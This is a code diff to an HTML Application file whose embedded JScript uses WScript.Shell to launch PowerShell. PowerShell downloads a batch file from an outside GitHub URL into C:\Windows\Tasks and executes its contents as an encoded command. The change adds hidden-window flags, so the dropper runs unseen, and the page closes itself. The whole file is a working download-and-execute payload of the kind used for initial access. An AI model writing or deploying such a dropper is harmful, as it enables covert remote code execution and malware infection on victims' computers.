@@ -1,13 +1,14 @@
-<html>
-<head>
-<script language="JScript">
-var shell = new ActiveXObject("WScript.Shell");
-var res = shell.Run("powershell iwr -uri https://raw.githubusercontent.com/p477d343/T5CAMP/main/test.bat -outfile C:\\Windows\\Tasks\\test.bat; powershell -encodedCommand (Get-Content 'C:\\Windows\\Tasks\\test.bat' -raw)");
-</script>
-</head>
-<body>
-<script language="JScript">
-self.close();
-</script>
-</body>
-</html>
+    <html>
+    <head>
+    <script language="JScript">
+    var shell = new ActiveXObject("WScript.Shell");
+    var res = shell.Run("powershell -WindowStyle hidden iwr -uri https://raw.githubusercontent.com/p477d343/T5CAMP/main/test.bat -outfile C:\\Windows\\Tasks\\test.bat; powershell -WindowStyle hidden -encodedCommand (Get-Content 'C:\\Windows\\Tasks\\test.bat' -raw)");
+    </script>
+    </head>
+    <body>
+    <script language="JScript">
+    self.close();
+    </script>
+    </body>
+    </html>
+    <html>
